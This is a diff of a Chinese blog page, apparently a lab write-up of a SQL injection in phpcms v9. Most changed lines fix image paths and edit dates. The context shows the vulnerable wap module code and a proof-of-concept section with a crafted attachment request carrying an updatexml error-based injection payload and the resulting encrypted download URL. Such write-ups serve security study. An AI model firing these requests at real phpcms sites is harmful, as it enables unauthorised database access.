@@ -27,15 +27,15 @@
 <meta property="og:site_name" content="一giao我里giao">
 <meta property="og:description" content="前言phpcmsv9的sql注入漏洞">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://yoursite.com/.com//1.png">
-<meta property="og:image" content="http://yoursite.com/.com//2.png">
-<meta property="og:image" content="http://yoursite.com/.com//3.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/07/phpcmsv9Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/07/phpcmsv9Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/2.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/07/phpcmsv9Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/3.png">
 <meta property="article:published_time" content="2020-02-06T16:43:43.000Z">
-<meta property="article:modified_time" content="2020-04-10T09:14:16.639Z">
+<meta property="article:modified_time" content="2020-04-11T17:17:32.693Z">
 <meta property="article:author" content="wuwuwu">
 <meta property="article:tag" content="靶机渗透">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://yoursite.com/.com//1.png">
+<meta name="twitter:image" content="http://yoursite.com/2020/02/07/phpcmsv9Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1.png">
 
 <link rel="canonical" href="http://yoursite.com/2020/02/07/phpcmsv9Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
 
@@ -185,7 +185,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-04-10 17:14:16" itemprop="dateModified" datetime="2020-04-10T17:14:16+08:00">2020-04-10</time>
+                <time title="Modified: 2020-04-12 01:17:32" itemprop="dateModified" datetime="2020-04-12T01:17:32+08:00">2020-04-12</time>
               </span>
 
           
@@ -277,14 +277,14 @@
 <p>定位<code>./phpcms/modules/wap/index.php</code></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;		</span><br><span class="line">		<span class="keyword">$this</span>-&gt;db = pc_base::load_model(<span class="string">'content_model'</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;siteid = <span class="keyword">isset</span>($_GET[<span class="string">'siteid'</span>]) &amp;&amp; (intval($_GET[<span class="string">'siteid'</span>]) &gt; <span class="number">0</span>) ? intval(trim($_GET[<span class="string">'siteid'</span>])) : (param::get_cookie(<span class="string">'siteid'</span>) ? param::get_cookie(<span class="string">'siteid'</span>) : <span class="number">1</span>);</span><br><span class="line">		param::set_cookie(<span class="string">'siteid'</span>,<span class="keyword">$this</span>-&gt;siteid);	</span><br><span class="line">		<span class="keyword">$this</span>-&gt;wap_site = getcache(<span class="string">'wap_site'</span>,<span class="string">'wap'</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;types = getcache(<span class="string">'wap_type'</span>,<span class="string">'wap'</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;wap = <span class="keyword">$this</span>-&gt;wap_site[<span class="keyword">$this</span>-&gt;siteid];</span><br><span class="line">		define(<span class="string">'WAP_SITEURL'</span>, <span class="keyword">$this</span>-&gt;wap[<span class="string">'domain'</span>] ? <span class="keyword">$this</span>-&gt;wap[<span class="string">'domain'</span>].<span class="string">'index.php?'</span> : APP_PATH.<span class="string">'index.php?m=wap&amp;siteid='</span>.<span class="keyword">$this</span>-&gt;siteid);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;wap[<span class="string">'status'</span>]!=<span class="number">1</span>) <span class="keyword">exit</span>(L(<span class="string">'wap_close_status'</span>));</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.com//1.png" alt="1581073053853"></p>
+<p><img src="/2020/02/07/phpcmsv9Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1.png" alt="1581073053853"></p>
 <h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>生成密文:</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id%3d%25*27+and+updatexml(1%2cconcat(1%2c(user()))%2c1)%23%26m%3d1%26f%3dcookie%26modelid%3d1%26catid%3d1%26</span><br><span class="line"></span><br><span class="line">POST:userid_flash=369b_CwjZql56-b8HtNPMGzWLTEj3sQF4h1VLxYY</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.com//2.png" alt="1581074961288"></p>
+<p><img src="/2020/02/07/phpcmsv9Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/2.png" alt="1581074961288"></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?m=content&amp;c=down&amp;a=init&amp;a_k=<span class="number">6</span>c09EmoZrtqeCKGWcv5iTTkQNeo0bVuMegMOvaPLNZ6SEeyG5sK0TxNum_xlEkgbv6lthq3oE18R3-XpRSPrH7sGkoPxbI1bFePqHtcAMMKV5BpYJq3NE-HNZgT_4xlDmk7mDtHjcg798pB7wQx4i-IPN6mOFQtXIdkxhz1i3KdZViOX0UcU8oNVWDOEmYKLl69Ftjn_HGUw3r5mGa8ikLbbP-rdWhC0QfJMg4sUC9eDJyzuOlZRu7kkEyCzKf<span class="number">-6</span>oF8Che9kYnGOAsWmgxuhkY7uqndWSZQBFKxUkksklkoTtZG7qIv-lUZhNPg25ateNkESCJSZPxHRCCtfArr-_i5lTy5uA0yN9pEr6wtsMs8j_mz9xAd0rur08gw_xUVv6y7AMdzfMUjQhUhr6gDPcgUZWplKDwsZBWKUOV-ROmJS4I9EJ94sstd-KRCiwLe85YrQWvHTJuzzy2ZNFCAkDghc__b-hzy8</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.com//3.png" alt="1581075019899"></p>
+<p><img src="/2020/02/07/phpcmsv9Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/3.png" alt="1581075019899"></p>
 
     </div>
 
@@ -388,7 +388,7 @@
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
